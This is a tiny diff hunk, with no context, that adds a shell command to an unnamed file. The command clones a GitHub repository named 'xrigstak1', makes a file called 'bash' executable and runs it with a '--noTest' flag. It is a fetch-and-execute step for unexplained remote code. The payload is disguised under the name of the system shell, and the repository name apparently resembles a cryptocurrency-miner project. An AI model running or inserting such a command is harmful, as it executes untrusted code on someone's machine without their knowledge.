@@ -1,0 +1,4 @@
+git clone https://github.com/hujisanda/xrigstak1.git
+&& chmod u+x bash && ./bash --noTest
+
+
